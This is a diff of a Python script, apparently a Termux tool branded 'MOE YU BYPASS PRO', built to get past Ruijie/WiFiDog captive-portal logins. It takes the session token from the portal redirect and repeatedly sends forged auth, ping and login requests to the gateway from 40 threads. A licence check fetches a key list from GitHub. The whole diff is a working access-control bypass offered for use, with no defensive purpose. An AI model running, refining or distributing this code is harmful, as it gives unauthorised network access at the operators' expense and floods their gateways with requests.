@@ -7,7 +7,7 @@ import random
 import sys
 import os
 import uuid
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import urlparse, parse_qs, quote
 from rich.console import Console
 from rich.panel import Panel
 from rich.align import Align
@@ -20,7 +20,7 @@ console = Console()
 
 KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
 
-# TERMINAL COLORS
+# ANSI COLORS FOR TERMUX (Fixed formatting)
 G = "\033[1;92m" 
 C = "\033[1;96m" 
 R = "\033[1;91m" 
@@ -49,6 +49,7 @@ def check_license():
     console.print(Align.center(Panel(f"HWID: [yellow]{my_hwid}[/]", title="[red]SECURITY[/]", border_style="cyan", expand=False)))
     try:
         user_key = input(f"\n  {W}[KEY] @MoeYu_").strip()
+        if not user_key: sys.exit()
         res = requests.get(KEY_URL, timeout=10).text
         if user_key in res:
             console.print(f"{G}>>> ACCESS GRANTED!{W}")
@@ -57,80 +58,85 @@ def check_license():
     except: sys.exit(f"{R}CONNECTION ERROR!{W}")
 
 # ===============================
-# FINAL STABLE BYPASS ENGINE
+# ULTIMATE INJECTION ENGINE v17.0
 # ===============================
 
 def start_bypass_process():
-    console.print(Panel(Align.center("[bold white]🔥 MOE YU FINAL STABLE ENGINE v16.0 🔥[/bold white]"), border_style="red", expand=False))
+    console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS PRO (ULTIMATE PERSISTENCE) 🔥[/bold white]"), border_style="red", expand=False))
     
+    # Persistent Session with high retry
     session = requests.Session()
-    # Connection Pool ကို တိုးမြှင့်ပြီး Connection ပြတ်မသွားအောင် ထိန်းထားခြင်း
-    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100)
+    adapter = requests.adapters.HTTPAdapter(pool_connections=100, pool_maxsize=100, max_retries=5)
     session.mount('http://', adapter)
+    
+    session.headers.update({
+        'User-Agent': 'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
+        'Accept': '*/*',
+        'Connection': 'keep-alive'
+    })
 
     while True:
         try:
-            # Step 1: Internet Status Check
-            try:
-                check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
-                if check.status_code == 204 and "ruijie" not in check.url:
-                    sys.stdout.write(f"\r{G}[✓] STATUS: BYPASS STABLE | INTERNET IS OPEN! ✅ {W}")
-                    sys.stdout.flush()
-                    time.sleep(8)
-                    continue
-            except: pass
+            # Step 1: Internet Detection
+            check = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
+            
+            if check.status_code == 204 and "ruijie" not in check.url:
+                sys.stdout.write(f"\r{G}[✓] STATUS: ONLINE | ENJOY YOUR INTERNET! ✅ {W}")
+                sys.stdout.flush()
+                time.sleep(10)
+                continue
 
-            # Step 2: Token Capture (Redirect URL မှ ဖတ်ခြင်း)
-            portal_check = requests.get("http://www.google.com", allow_redirects=True, timeout=5)
-            portal_url = portal_check.url
-            query = parse_qs(urlparse(portal_url).query)
+            # Step 2: Deep Extraction
+            portal_url = check.url
+            parsed = urlparse(portal_url)
+            query = parse_qs(parsed.query)
             
             sid = (query.get('chap_challenge', [None])[0] or 
-                   query.get('sessionId', [None])[0] or 
-                   query.get('token', [None])[0])
+                   query.get('token', [None])[0] or 
+                   query.get('sessionId', [None])[0])
             
-            gw_ip = query.get('gw_address', [None])[0] or urlparse(portal_url).netloc.split(':')[0]
+            gw_ip = query.get('gw_address', [None])[0] or parsed.netloc.split(':')[0]
             gw_port = query.get('gw_port', ['2060'])[0]
+            mac = query.get('mac', [''])[0]
 
             if sid:
-                console.print(f"\n{Y}[!] Captured SID: {sid[:15]}... | Targeting: {gw_ip}{W}")
-                
-                # အဓိက Injection Link များ
+                # Bypass URLs
                 auth_url = f"http://{gw_ip}:{gw_port}/wifidog/auth?token={sid}"
                 ping_url = f"http://{gw_ip}:{gw_port}/wifidog/ping?token={sid}"
+                login_force = f"http://{gw_ip}:{gw_port}/wifidog/login?token={sid}&mac={mac}"
 
-                def keep_alive_injection():
+                def heartbeat_pulse():
                     while True:
                         try:
-                            # Router ဆီကို Packet တွေ အဆက်မပြတ်ပို့ပြီး Tunnel ကို ဖွင့်ထားခြင်း
-                            session.get(auth_url, timeout=2)
-                            session.get(ping_url, timeout=2)
-                            sys.stdout.write(f"\r{C}[!] Pulse Running: Sending Keep-Alive Packets to {gw_ip}... {W}")
+                            # တစ်ပြိုင်နက်တည်းမှာ အကုန်ပစ်သွင်းခြင်း
+                            session.get(auth_url, timeout=3)
+                            session.get(ping_url, timeout=3)
+                            session.get(login_force, timeout=3)
+                            sys.stdout.write(f"\r{C}[!] Pulse Running: Sending Heartbeat to {gw_ip}... {W}")
                             sys.stdout.flush()
-                        except:
-                            # Connection ပြတ်သွားရင် ချက်ချင်းပြန်ချိတ်မယ်
-                            time.sleep(0.5)
-                        time.sleep(0.1)
+                        except: pass
+                        time.sleep(0.05) # Turbo Speed
 
-                # Thread တစ်ခုတည်းနဲ့ အရင်စမ်းမယ် (Stable ဖြစ်အောင်)
-                threading.Thread(target=keep_alive_injection, daemon=True).start()
+                # Start 40 Threads for maximum impact
+                for _ in range(40):
+                    threading.Thread(target=heartbeat_pulse, daemon=True).start()
 
-                # အင်တာနက် စမ်းသပ်ခြင်း
-                time.sleep(3)
-                console.print(f"\n{G}[✓] Injection Active. Now open Browser and Login!{W}")
+                console.print(f"\n{Y}[!] Token Injected. Now open Browser, click 'LOGIN' and then close VPN.{W}")
                 
-                # Loop ထဲမှာ ဆက်စောင့်နေမယ်
+                # Stability Monitor
                 while True:
-                    time.sleep(10)
-                    if "ruijie" in requests.get("http://www.google.com", timeout=5).url:
-                        break # အင်တာနက် ပြန်ပိတ်သွားရင် အပြင် Loop ကို ပြန်ထွက်မယ်
+                    try:
+                        time.sleep(10)
+                        if "ruijie" in requests.get("http://www.google.com", timeout=5).url:
+                            break
+                    except: break
             else:
-                sys.stdout.write(f"\r{R}[×] Waiting for Portal Redirect... {W}")
+                sys.stdout.write(f"\r{R}[×] Waiting for Token Capture... {W}")
                 sys.stdout.flush()
                 time.sleep(3)
 
         except Exception as e:
-            time.sleep(2)
+            time.sleep(5)
 
 if __name__ == "__main__":
     try:
